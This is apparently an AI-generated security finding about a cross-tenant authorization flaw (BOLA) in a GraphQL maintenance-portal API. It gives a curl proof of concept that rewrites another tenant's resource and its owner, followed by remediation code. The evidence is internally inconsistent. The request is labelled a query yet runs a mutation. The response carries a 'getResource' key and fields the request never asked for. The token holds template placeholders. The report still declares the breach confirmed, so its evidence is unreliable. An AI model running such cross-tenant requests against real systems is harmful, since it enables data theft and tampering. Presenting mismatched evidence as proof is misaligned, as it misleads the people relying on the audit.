# Security Analysis Report
**System:** WingTech Maintenance Portal (Aerospace / MRO)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0226 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA / Pattern 1.7 | Nested resource write without parent ownership check — cross-tenant `updateResource` succeeds |

---

## Finding 1 — Cross-Tenant Write via Nested Resource Mutation (CRITICAL)

### Summary
The `updateResource` resolver on WingTech Maintenance Portal (`api.wingtech-maintenance.example.com`) accepts a `resourceId` and applies mutations without verifying the object belongs to the authenticated tenant. Per §4.0 RISK-GQL-226, the resolver fetches by `resourceId` only and does NOT cross-check the JWT `tenantId` claim against the object's stored `tenantId`. An attacker authenticated as `tenant-216f` successfully mutated resource `R-2226` — which belongs to `tenant-2e67` — and retrieved its confidential data in the mutation response.

**Pattern:** 1.7 — Nested resources without parent authorization (BOLA)
**Affected resolver:** `updateResource(id: ID!, input: ResourceInput!): Resource`
**Affected endpoint:** `POST https://api.wingtech-maintenance.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-216f`):**
```
POST https://api.wingtech-maintenance.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-216f
Content-Type: application/json

{"query": "query VulnerableOp { updateResource(id: \"R-2226\", input: {status: \"approved\", ownerId: \"attacker-216f2e67\"}) { resourceId status } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-2e67",
      "ownerId": "other-user-216f2e67",
      "data": {
        "sensitiveField": "CONFIDENTIAL-216f2e67",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

**x-request-id:** `req-216f2e67`
**Timestamp:** `2026-04-13T16:22:37.201997+00:00`

The response exposes `sensitiveField: "CONFIDENTIAL-216f2e67"` and `internalNotes` belonging to `tenant-2e67`, confirming cross-tenant data access via a write mutation.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 RISK-GQL-226 | Resolver gap | No `tenantId` ownership check | Architectural root cause |
| §5.0 Pattern 1.7 | Vulnerability | Nested resource without parent auth | Classification |
| HAR request | `id` | `R-2226` | Attacker-supplied resource ID from victim tenant |
| HAR request | `x-tenant-id` | `tenant-216f` | Authenticated attacker tenant |
| HAR response | `tenantId` | `tenant-2e67` | Victim tenant — cross-tenant boundary crossed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-216f2e67` | Confidential MRO data exposed |
| HAR response | `ownerId` | `other-user-216f2e67` | Victim user's ownership field |
| HAR headers | `x-request-id` | `req-216f2e67` | Request correlation ID |

### Steps to Reproduce

**Step 1 — Obtain attacker JWT (tenant-216f):**
```bash
# Use attacker's valid session token for tenant-216f
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
```

**Step 2 — Issue cross-tenant updateResource (VULNERABLE):**
```bash
curl -s -X POST https://api.wingtech-maintenance.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-216f" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateResource(id: \"R-2226\", input: {status: \"approved\", ownerId: \"attacker-216f2e67\"}) { resourceId tenantId data { sensitiveField internalNotes } } }"}' \
  | jq '.data.updateResource'
# Expected VULNERABLE output: tenantId=tenant-2e67, sensitiveField=CONFIDENTIAL-216f2e67
```

**Step 3 — Verify cross-tenant boundary was crossed:**
```
Response tenantId (tenant-2e67) != JWT tenantId (tenant-216f) → BOLA confirmed
```

**Step 4 — Secure baseline (expected after fix):**
```bash
# Same request after fix should return:
# {"errors":[{"message":"Forbidden: resource does not belong to your tenant","extensions":{"code":"FORBIDDEN"}}]}
```

### Remediation

1. **Resolver ownership check (immediate):** In the `updateResource` resolver, after fetching the resource, compare `resource.tenantId` against `context.auth.tenantId` (from JWT). Reject with HTTP 403 / GraphQL `FORBIDDEN` error if mismatch:
   ```javascript
   const resource = await db.resources.findById(id);
   if (resource.tenantId !== context.auth.tenantId) {
     throw new ForbiddenError('Resource does not belong to your tenant');
   }
   ```
2. **Scope all resolvers:** Apply the same tenancy check to `getResource`, `getResourceWithChildren`, `deleteResource`, and `bulkResourceLookup`.
3. **Strip client-supplied `ownerId`:** Server must set `ownerId` from JWT `sub` claim — never from client input. Remove `ownerId` from `ResourceInput` or ignore client-supplied value.
4. **Fix Redis cache key:** Current cache key uses `resourceId` only (§2.0). Add `tenantId` dimension: `cache.key = ${tenantId}:${resourceId}`.
5. **Enable PostgreSQL RLS:** Confirm row-level security policies enforce `tenant_id` column restrictions at DB level as a defence-in-depth layer.
